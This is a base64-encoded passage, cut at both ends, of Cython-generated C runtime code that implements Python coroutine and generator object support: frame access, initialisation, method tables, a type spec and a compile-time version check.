lbGYtPmdpX3F1YWxuYW1lLCB2YWx1ZSk7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfX0Nvcm91dGluZV9nZXRfZnJhbWUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpzZWxmKVxue1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlPYmplY3QgKmZyYW1lO1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwXG4gICAgUHlfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihzZWxmKTtcbiAgICAjZW5kaWZcbiAgICBmcmFtZSA9IHNlbGYtPmdpX2ZyYW1lO1xuICAgIGlmICghZnJhbWUpIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmLT5naV9jb2RlKSkge1xuICAgICAgICAgICAgUHlfUkVUVVJOX05PTkU7XG4gICAgICAgIH1cbiAgICAgICAgUHlPYmplY3QgKmdsb2JhbHMgPSBQeURpY3RfTmV3KCk7XG4gICAgICAgIGlmICh1bmxpa2VseSghZ2xvYmFscykpIHJldHVybiBOVUxMO1xuICAgICAgICBmcmFtZSA9IChQeU9iamVjdCAqKSBQeUZyYW1lX05ldyhcbiAgICAgICAgICAgIFB5VGhyZWFkU3RhdGVfR2V0KCksICAgICAgICAgICAgXG4gICAgICAgICAgICAoUHlDb2RlT2JqZWN0Kikgc2VsZi0+Z2lfY29kZSwgIFxuICAgICAgICAgICAgZ2xvYmFscywgICAgICAgICAgICAgICAgICAgICAgICBcbiAgICAgICAgICAgIDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXG4gICAgICAgICk7XG4gICAgICAgIFB5X0RFQ1JFRihnbG9iYWxzKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFmcmFtZSkpXG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgaWYgKHVubGlrZWx5KHNlbGYtPmdpX2ZyYW1lKSkge1xuICAgICAgICAgICAgUHlfREVDUkVGKGZyYW1lKTtcbiAgICAgICAgICAgIGZyYW1lID0gc2VsZi0+Z2lfZnJhbWU7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBzZWxmLT5naV9mcmFtZSA9IGZyYW1lO1xuICAgICAgICB9XG4gICAgfVxuICAgIFB5X0lOQ1JFRihmcmFtZSk7XG4gICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbiAgICBQeV9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgICNlbmRpZlxuICAgIHJldHVybiBmcmFtZTtcbiNlbHNlXG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoc2VsZik7XG4gICAgUHlfUkVUVVJOX05PTkU7XG4jZW5kaWZcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9Db3JvdXRpbmVfZ2V0X2ZyYW1lKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqc2VsZiwgdm9pZCAqY29udGV4dCkge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIFB5T2JqZWN0ICpmcmFtZSA9IHNlbGYtPmdpX2ZyYW1lO1xuICAgIGlmIChmcmFtZSlcbiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihmcmFtZSk7XG4gICAgcmV0dXJuIF9fUHl4X19Db3JvdXRpbmVfZ2V0X2ZyYW1lKHNlbGYpO1xufVxuc3RhdGljIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19QeXhfX0Nvcm91dGluZV9OZXcoXG4gICAgICAgICAgICBQeVR5cGVPYmplY3QqIHR5cGUsIF9fcHl4X2Nvcm91dGluZV9ib2R5X3QgYm9keSwgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjbG9zdXJlLFxuICAgICAgICAgICAgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpxdWFsbmFtZSwgUHlPYmplY3QgKm1vZHVsZV9uYW1lKSB7XG4gICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSBQeU9iamVjdF9HQ19OZXcoX19weXhfQ29yb3V0aW5lT2JqZWN0LCB0eXBlKTtcbiAgICBpZiAodW5saWtlbHkoIWdlbikpXG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIHJldHVybiBfX1B5eF9fQ29yb3V0aW5lX05ld0luaXQoZ2VuLCBib2R5LCBjb2RlLCBjbG9zdXJlLCBuYW1lLCBxdWFsbmFtZSwgbW9kdWxlX25hbWUpO1xufVxuc3RhdGljIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19QeXhfX0Nvcm91dGluZV9OZXdJbml0KFxuICAgICAgICAgICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4sIF9fcHl4X2Nvcm91dGluZV9ib2R5X3QgYm9keSwgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjbG9zdXJlLFxuICAgICAgICAgICAgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpxdWFsbmFtZSwgUHlPYmplY3QgKm1vZHVsZV9uYW1lKSB7XG4gICAgZ2VuLT5ib2R5ID0gYm9keTtcbiAgICBnZW4tPmNsb3N1cmUgPSBjbG9zdXJlO1xuICAgIFB5X1hJTkNSRUYoY2xvc3VyZSk7XG4gICAgZ2VuLT5pc19ydW5uaW5nID0gMDtcbiAgICBnZW4tPnJlc3VtZV9sYWJlbCA9IDA7XG4gICAgZ2VuLT5jbGFzc29iaiA9IE5VTEw7XG4gICAgZ2VuLT55aWVsZGZyb20gPSBOVUxMO1xuICAgIGdlbi0+eWllbGRmcm9tX2FtX3NlbmQgPSBOVUxMO1xuICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgZ2VuLT5naV9leGNfc3RhdGUuZXhjX3ZhbHVlID0gTlVMTDtcbiAgICAjZWxzZVxuICAgIGdlbi0+Z2lfZXhjX3N0YXRlLmV4Y190eXBlID0gTlVMTDtcbiAgICBnZW4tPmdpX2V4Y19zdGF0ZS5leGNfdmFsdWUgPSBOVUxMO1xuICAgIGdlbi0+Z2lfZXhjX3N0YXRlLmV4Y190cmFjZWJhY2sgPSBOVUxMO1xuICAgICNlbmRpZlxuI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiAgICBnZW4tPmdpX2V4Y19zdGF0ZS5wcmV2aW91c19pdGVtID0gTlVMTDtcbiNlbmRpZlxuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBDMDAwMCB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgZ2VuLT5naV93ZWFrcmVmbGlzdCA9IE5VTEw7XG4jZW5kaWZcbiAgICBQeV9YSU5DUkVGKHF1YWxuYW1lKTtcbiAgICBnZW4tPmdpX3F1YWxuYW1lID0gcXVhbG5hbWU7XG4gICAgUHlfWElOQ1JFRihuYW1lKTtcbiAgICBnZW4tPmdpX25hbWUgPSBuYW1lO1xuICAgIFB5X1hJTkNSRUYobW9kdWxlX25hbWUpO1xuICAgIGdlbi0+Z2lfbW9kdWxlbmFtZSA9IG1vZHVsZV9uYW1lO1xuICAgIFB5X1hJTkNSRUYoY29kZSk7XG4gICAgZ2VuLT5naV9jb2RlID0gY29kZTtcbiAgICBnZW4tPmdpX2ZyYW1lID0gTlVMTDtcbiAgICBQeU9iamVjdF9HQ19UcmFjayhnZW4pO1xuICAgIHJldHVybiBnZW47XG59XG5zdGF0aWMgY2hhciBfX1B5eF9Db3JvdXRpbmVfdGVzdF9hbmRfc2V0X2lzX3J1bm5pbmcoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pIHtcbiAgICBjaGFyIHJlc3VsdDtcbiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oZ2VuKTtcbiAgICAjZW5kaWZcbiAgICByZXN1bHQgPSBnZW4tPmlzX3J1bm5pbmc7XG4gICAgZ2VuLT5pc19ydW5uaW5nID0gMTtcbiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgI2VuZGlmXG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyB2b2lkIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuKSB7XG4gICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeV9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKGdlbik7XG4gICAgI2VuZGlmXG4gICAgYXNzZXJ0KGdlbi0+aXNfcnVubmluZyk7XG4gICAgZ2VuLT5pc19ydW5uaW5nID0gMDtcbiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgI2VuZGlmXG59XG5zdGF0aWMgY2hhciBfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pIHtcbiAgICBjaGFyIHJlc3VsdDtcbiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oZ2VuKTtcbiAgICAjZW5kaWZcbiAgICByZXN1bHQgPSBnZW4tPmlzX3J1bm5pbmc7XG4gICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeV9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgICNlbmRpZlxuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9nZXRfaXNfcnVubmluZ19nZXR0ZXIoUHlPYmplY3QgKmdlbiwgdm9pZCAqY2xvc3VyZSkge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNsb3N1cmUpO1xuICAgIGNoYXIgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nKChfX3B5eF9Db3JvdXRpbmVPYmplY3QqKWdlbik7XG4gICAgaWYgKHJlc3VsdCkgUHlfUkVUVVJOX1RSVUU7XG4gICAgZWxzZSBQeV9SRVRVUk5fRkFMU0U7XG59XG4jaWYgX19QWVhfSEFTX1BZX0FNX1NFTkQgPT0gMlxuc3RhdGljIHZvaWQgX19QeXhfU2V0QmFja3BvcnRUeXBlQW1TZW5kKFB5VHlwZU9iamVjdCAqdHlwZSwgX19QeXhfUHlBc3luY01ldGhvZHNTdHJ1Y3QgKnN0YXRpY19hbXNlbmRfbWV0aG9kcywgX19QeXhfcHlpdGVyX3NlbmRmdW5jIGFtX3NlbmQpIHtcbiAgICBQeV9zc2l6ZV90IHB0cl9vZmZzZXQgPSAoY2hhciopKHR5cGUtPnRwX2FzX2FzeW5jKSAtIChjaGFyKil0eXBlO1xuICAgIGlmIChwdHJfb2Zmc2V0IDwgMCB8fCBwdHJfb2Zmc2V0ID4gdHlwZS0+dHBfYmFzaWNzaXplKSB7XG4gICAgICAgIHJldHVybjtcbiAgICB9XG4gICAgbWVtY3B5KCh2b2lkKilzdGF0aWNfYW1zZW5kX21ldGhvZHMsICh2b2lkKikodHlwZS0+dHBfYXNfYXN5bmMpLCBzaXplb2YoKnR5cGUtPnRwX2FzX2FzeW5jKSk7XG4gICAgc3RhdGljX2Ftc2VuZF9tZXRob2RzLT5hbV9zZW5kID0gYW1fc2VuZDtcbiAgICB0eXBlLT50cF9hc19hc3luYyA9IF9fUHl4X1Nsb3RUcEFzQXN5bmMoc3RhdGljX2Ftc2VuZF9tZXRob2RzKTtcbn1cbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfZmFpbF9yZWR1Y2VfZXgoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICphcmcpIHtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihhcmcpO1xuICAgIF9fUHl4X1R5cGVOYW1lIHNlbGZfdHlwZV9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeV9UWVBFKChQeU9iamVjdCopc2VsZikpO1xuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsICJjYW5ub3QgcGlja2xlIFwnIiBfX1B5eF9GTVRfVFlQRU5BTUUgIlwnIG9iamVjdCIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgc2VsZl90eXBlX25hbWUpO1xuICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShzZWxmX3R5cGVfbmFtZSk7XG4gICAgcmV0dXJuIE5VTEw7XG59XG5cblxuc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X0dlbmVyYXRvcl9tZXRob2RzW10gPSB7XG4gICAgeyJzZW5kIiwgKFB5Q0Z1bmN0aW9uKSBfX1B5eF9Db3JvdXRpbmVfU2VuZCwgTUVUSF9PLFxuICAgICBQeURvY19TVFIoInNlbmQoYXJnKSAtPiBzZW5kIFwnYXJnXCcgaW50byBnZW5lcmF0b3IsXFxucmV0dXJuIG5leHQgeWllbGRlZCB2YWx1ZSBvciByYWlzZSBTdG9wSXRlcmF0aW9uLiIpfSxcbiAgICB7InRocm93IiwgKFB5Q0Z1bmN0aW9uKSBfX1B5eF9Db3JvdXRpbmVfVGhyb3csIE1FVEhfVkFSQVJHUyxcbiAgICAgUHlEb2NfU1RSKCJ0aHJvdyh0eXBbLHZhbFssdGJdXSkgLT4gcmFpc2UgZXhjZXB0aW9uIGluIGdlbmVyYXRvcixcXG5yZXR1cm4gbmV4dCB5aWVsZGVkIHZhbHVlIG9yIHJhaXNlIFN0b3BJdGVyYXRpb24uIil9LFxuICAgIHsiY2xvc2UiLCAoUHlDRnVuY3Rpb24pIF9fUHl4X0Nvcm91dGluZV9DbG9zZV9NZXRob2QsIE1FVEhfTk9BUkdTLFxuICAgICBQeURvY19TVFIoImNsb3NlKCkgLT4gcmFpc2UgR2VuZXJhdG9yRXhpdCBpbnNpZGUgZ2VuZXJhdG9yLiIpfSxcbiAgICB7Il9fcmVkdWNlX2V4X18iLCAoUHlDRnVuY3Rpb24pIF9fUHl4X0Nvcm91dGluZV9mYWlsX3JlZHVjZV9leCwgTUVUSF9PLCAwfSxcbiAgICB7Il9fcmVkdWNlX18iLCAoUHlDRnVuY3Rpb24pIF9fUHl4X0Nvcm91dGluZV9mYWlsX3JlZHVjZV9leCwgTUVUSF9OT0FSR1MsIDB9LFxuICAgIHswLCAwLCAwLCAwfVxufTtcbnN0YXRpYyBQeU1lbWJlckRlZiBfX3B5eF9HZW5lcmF0b3JfbWVtYmVybGlzdFtdID0ge1xuICAgIHsiZ2lfeWllbGRmcm9tIiwgVF9PQkpFQ1QsIG9mZnNldG9mKF9fcHl4X0Nvcm91dGluZU9iamVjdCwgeWllbGRmcm9tKSwgUkVBRE9OTFksXG4gICAgIFB5RG9jX1NUUigib2JqZWN0IGJlaW5nIGl0ZXJhdGVkIGJ5IFwneWllbGQgZnJvbVwnLCBvciBOb25lIil9LFxuICAgIHsiZ2lfY29kZSIsIFRfT0JKRUNULCBvZmZzZXRvZihfX3B5eF9Db3JvdXRpbmVPYmplY3QsIGdpX2NvZGUpLCBSRUFET05MWSwgTlVMTH0sXG4gICAgeyJfX21vZHVsZV9fIiwgVF9PQkpFQ1QsIG9mZnNldG9mKF9fcHl4X0Nvcm91dGluZU9iamVjdCwgZ2lfbW9kdWxlbmFtZSksIDAsIDB9LFxuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBDMDAwMCB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgeyJfX3dlYWtsaXN0b2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihfX3B5eF9Db3JvdXRpbmVPYmplY3QsIGdpX3dlYWtyZWZsaXN0KSwgUkVBRE9OTFksIDB9LFxuI2VuZGlmXG4gICAgezAsIDAsIDAsIDAsIDB9XG59O1xuc3RhdGljIFB5R2V0U2V0RGVmIF9fcHl4X0dlbmVyYXRvcl9nZXRzZXRzW10gPSB7XG4gICAgeyJfX25hbWVfXyIsIChnZXR0ZXIpX19QeXhfQ29yb3V0aW5lX2dldF9uYW1lLCAoc2V0dGVyKV9fUHl4X0Nvcm91dGluZV9zZXRfbmFtZSxcbiAgICAgUHlEb2NfU1RSKCJuYW1lIG9mIHRoZSBnZW5lcmF0b3IiKSwgMH0sXG4gICAgeyJfX3F1YWxuYW1lX18iLCAoZ2V0dGVyKV9fUHl4X0Nvcm91dGluZV9nZXRfcXVhbG5hbWUsIChzZXR0ZXIpX19QeXhfQ29yb3V0aW5lX3NldF9xdWFsbmFtZSxcbiAgICAgUHlEb2NfU1RSKCJxdWFsaWZpZWQgbmFtZSBvZiB0aGUgZ2VuZXJhdG9yIiksIDB9LFxuICAgIHsiZ2lfZnJhbWUiLCAoZ2V0dGVyKV9fUHl4X0Nvcm91dGluZV9nZXRfZnJhbWUsIE5VTEwsXG4gICAgIFB5RG9jX1NUUigiRnJhbWUgb2YgdGhlIGdlbmVyYXRvciIpLCAwfSxcbiAgICB7ImdpX3J1bm5pbmciLCBfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmdfZ2V0dGVyLCBOVUxMLCBOVUxMLCBOVUxMfSxcbiAgICB7MCwgMCwgMCwgMCwgMH1cbn07XG5zdGF0aWMgUHlUeXBlX1Nsb3QgX19weXhfR2VuZXJhdG9yVHlwZV9zbG90c1tdID0ge1xuICAgIHtQeV90cF9kZWFsbG9jLCAodm9pZCAqKV9fUHl4X0Nvcm91dGluZV9kZWFsbG9jfSxcbiAgICB7UHlfdHBfdHJhdmVyc2UsICh2b2lkICopX19QeXhfQ29yb3V0aW5lX3RyYXZlcnNlfSxcbiAgICB7UHlfdHBfaXRlciwgKHZvaWQgKilQeU9iamVjdF9TZWxmSXRlcn0sXG4gICAge1B5X3RwX2l0ZXJuZXh0LCAodm9pZCAqKV9fUHl4X0dlbmVyYXRvcl9OZXh0fSxcbiAgICB7UHlfdHBfbWV0aG9kcywgKHZvaWQgKilfX3B5eF9HZW5lcmF0b3JfbWV0aG9kc30sXG4gICAge1B5X3RwX21lbWJlcnMsICh2b2lkICopX19weXhfR2VuZXJhdG9yX21lbWJlcmxpc3R9LFxuICAgIHtQeV90cF9nZXRzZXQsICh2b2lkICopX19weXhfR2VuZXJhdG9yX2dldHNldHN9LFxuICAgIHtQeV90cF9nZXRhdHRybywgKHZvaWQgKikgUHlPYmplY3RfR2VuZXJpY0dldEF0dHJ9LFxuI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgICB7UHlfdHBfZmluYWxpemUsICh2b2lkICopX19QeXhfQ29yb3V0aW5lX2RlbH0sXG4jZW5kaWZcbiNpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAxXG4gICAge1B5X2FtX3NlbmQsICh2b2lkICopX19QeXhfQ29yb3V0aW5lX0FtU2VuZH0sXG4jZW5kaWZcbiAgICB7MCwgMH0sXG59O1xuc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X0dlbmVyYXRvclR5cGVfc3BlYyA9IHtcbiAgICBfX1BZWF9UWVBFX01PRFVMRV9QUkVGSVggImdlbmVyYXRvciIsXG4gICAgc2l6ZW9mKF9fcHl4X0Nvcm91dGluZU9iamVjdCksXG4gICAgMCxcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlfVFBGTEFHU19NQU5BR0VEX1dFQUtSRUYgfFxuI2VuZGlmXG4gICAgUHlfVFBGTEFHU19JTU1VVEFCTEVUWVBFIHwgUHlfVFBGTEFHU19ESVNBTExPV19JTlNUQU5USUFUSU9OIHxcbiAgICBQeV9UUEZMQUdTX0RFRkFVTFQgfCBQeV9UUEZMQUdTX0hBVkVfR0MgfCBfX1B5eF9UUEZMQUdTX0hBVkVfQU1fU0VORCxcbiAgICBfX3B5eF9HZW5lcmF0b3JUeXBlX3Nsb3RzXG59O1xuI2lmIF9fUFlYX0hBU19QWV9BTV9TRU5EID09IDJcbnN0YXRpYyBfX1B5eF9QeUFzeW5jTWV0aG9kc1N0cnVjdCBfX3B5eF9HZW5lcmF0b3JfYXNfYXN5bmM7XG4jZW5kaWZcbnN0YXRpYyBpbnQgX19weXhfR2VuZXJhdG9yX2luaXQoUHlPYmplY3QgKm1vZHVsZSkge1xuICAgIF9fcHl4X21zdGF0ZXR5cGUgKm1zdGF0ZSA9IF9fUHl4X1B5TW9kdWxlX0dldFN0YXRlKG1vZHVsZSk7XG4gICAgbXN0YXRlLT5fX3B5eF9HZW5lcmF0b3JUeXBlID0gX19QeXhfRmV0Y2hDb21tb25UeXBlRnJvbVNwZWMoXG4gICAgICAgIG1zdGF0ZS0+X19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NUeXBlLCBtb2R1bGUsICZfX3B5eF9HZW5lcmF0b3JUeXBlX3NwZWMsIE5VTEwpO1xuICAgIGlmICh1bmxpa2VseSghbXN0YXRlLT5fX3B5eF9HZW5lcmF0b3JUeXBlKSkge1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuI2lmIF9fUFlYX0hBU19QWV9BTV9TRU5EID09IDJcbiAgICBfX1B5eF9TZXRCYWNrcG9ydFR5cGVBbVNlbmQobXN0YXRlLT5fX3B5eF9HZW5lcmF0b3JUeXBlLCAmX19weXhfR2VuZXJhdG9yX2FzX2FzeW5jLCAmX19QeXhfQ29yb3V0aW5lX0FtU2VuZCk7XG4jZW5kaWZcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2VuZXJhdG9yX0dldElubGluZWRSZXN1bHQoUHlPYmplY3QgKnNlbGYpIHtcbiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QqKSBzZWxmO1xuICAgIFB5T2JqZWN0ICpyZXR2YWwgPSBOVUxMO1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9Db3JvdXRpbmVfdGVzdF9hbmRfc2V0X2lzX3J1bm5pbmcoZ2VuKSkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbik7XG4gICAgfVxuICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KGdlbiwgUHlfTm9uZSwgJnJldHZhbCwgMCk7XG4gICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTtcbiAgICAodm9pZCkgcmVzdWx0O1xuICAgIGFzc2VydCAocmVzdWx0ID09IFBZR0VOX1JFVFVSTiB8fCByZXN1bHQgPT0gUFlHRU5fRVJST1IpO1xuICAgIGFzc2VydCAoKHJlc3VsdCA9PSBQWUdFTl9SRVRVUk4gJiYgcmV0dmFsICE9IE5VTEwpIHx8IChyZXN1bHQgPT0gUFlHRU5fRVJST1IgJiYgcmV0dmFsID09IE5VTEwpKTtcbiAgICByZXR1cm4gcmV0dmFsO1xufVxuXG5cbnN0YXRpYyBpbnQgX19QeXhfY2hlY2tfYmluYXJ5X3ZlcnNpb24odW5zaWduZWQgbG9uZyBjdF92ZXJzaW9uLCB1bnNpZ25lZCBsb25nIHJ0X3ZlcnNpb24sIGludCBhbGxvd19uZXdlcikge1xuICAgIGNvbnN0IHVuc2lnbmVkIGxvbmcgTUFKT1JfTUlOT1IgPSAweEZGRkYwMDAwVUw7XG4gICAgaWYgKChydF92ZXJzaW9uICYgTUFKT1JfTUlOT1IpID09IChjdF92ZXJzaW9uICYgTUFKT1JfTUlOT1IpKVxuICAgICAgICByZXR1cm4gMDtcbiAgICBpZiAobGlrZWx5KGFsbG93X25ld2VyICYmIChydF92ZXJzaW9uICYgTUFKT1JfTUlOT1IpID4gKGN0X3ZlcnNpb24gJiBNQUpPUl9NSU5PUikpKVxuICAgICAgICByZXR1cm4gMTtcbiAgICB7XG4gICAgICAgIGNoYXIgbWVzc2FnZVsyMDBdO1xuICAgICAgICBQeU9TX3NucHJpbnRmKG1lc3NhZ2UsIHNpemVvZihtZXNzYWdlKSxcbiAgICAgICAgICAgICAgICAgICAgICAiY29tcGlsZSB0aW1lIFB5dGhvbiB2ZXJzaW9uICVkLiVkICJcbiAgICAgICAgICAgICAgICAgICAgICAib2YgbW9kdWxlIFwnJS4xMDBzXCcgIlxuICAgICAgICAgICAgICAgICAgICAgICIlcyAiXG4gICAgICAgICAgICAgICAgICAgICAgInJ1bnRpbWUgdmVyc2lvbiAlZC4lZCIsXG4gICAgICAgICAgICAgICAgICAgICAgIChpbnQpIChjdF92ZXJzaW9uID4+IDI0KSwgKGludCkgKChjdF92ZXJzaW9uID4+IDE2KSAmIDB4RkYpLFxuICAgICAgICAgICAgICAgICAgICAgICBfX1B5eF9NT0RVTEVfTkFNRSxcbiAgICAgICAgICAgICAgICAgICAgICAgKGFsbG93X25ld2VyKSA/ICJ3YXMgbmV3ZXIgdGhhbiIgOiAiZG9lcyBub3QgbWF0Y2giLFxuICAgICAgICAgICAgICAgICAgICAgICAoaW50KSAocnRfdmVyc2lvbiA+PiAyNCksIChpbnQpICgocnRfdmVyc2lvbiA+PiAxNikgJiAweEZGKVxuICAgICAgICk7XG4gICAgICAgIHJldHVybiBQeUVycl9XYXJuRXgoTlVMTCwgbWVzc2FnZSwgMSk7XG4gICAgfVxufVxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9fUHlDb2RlX05ldyhpbnQgYSwgaW50IHAsIGludCBrLCBpbnQgbCwgaW50IHMsIGludCBmLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjLCBQeU9iamVjdCogbiwgUHlPYmplY3QgKnYsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZnYsIFB5T2JqZWN0ICpjZWxsLCBQeU9iamVjdCogZm4sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqbmFtZSwgaW50IGZsaW5lLCBQeU9iamVjdCAqbG5vcykge1xuICAgICAgICBQeU9iamVjdCAqZXhjZXB0aW9uX3RhYmxlID0gTlVMTDtcbiAgICAgICAgUHlPYmplY3QgKnR5cGVzX21vZHVsZT1OVUxMLCAqY29kZV90eXBlPU5VTEwsICpyZXN1bHQ9TlVMTDtcbiAgICAgICAgI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMGIwMDAwXG4gICAgICAgIFB5T2JqZWN0ICp2ZXJzaW9uX2luZm87XG4gICAgICAgIFB5T2JqZWN0ICpweV9taW5vcl92ZXJzaW9uID0gTlVMTDtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGxvbmcgbWlub3JfdmVyc2lvbiA9IDA7XG4gICAgICAgIFB5T2JqZWN0ICp0eXBlLCAqdmFsdWUsICp0cmFjZWJhY2s7XG4gICAgICAgIFB5RXJyX0ZldGNoKCZ0eXBlLCAmdmFsdWUsICZ0cmFjZWJhY2spO1xuICAgICAgICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGIwMDAwXG4gICAgICAgIG1pbm9yX3ZlcnNpb24gPSAxMTtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgaWYgKCEodmVyc2lvbl9pbmZvID0gUHlTeXNfR2V0T2JqZWN0KCJ2ZXJzaW9uX2luZm8iKSkpIGdvdG8gZW5kO1xuICAgICAgICBpZiAoIShweV9taW5vcl92ZXJzaW9uID0gUHlTZXF1ZW5jZV9HZXRJdGVtKHZlcnNpb25faW5mbywgMSkpKSBnb3RvIGVuZDtcbiAgICAgICAgbWlub3JfdmVyc2lvbiA9IFB5TG9uZ19Bc0xvbmcocHlfbWlub3JfdmVyc2lvbik7XG4gICAgICAgIFB5X0RFQ1JFRihweV9taW5vcl92ZXJzaW9uKTtcbiAgICAgICAgaWYgKG1pbm9yX3ZlcnNpb24gPT0gLTEgJiYgUHlFcnJfT2NjdXJyZWQoKSkgZ290byBlbmQ7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBp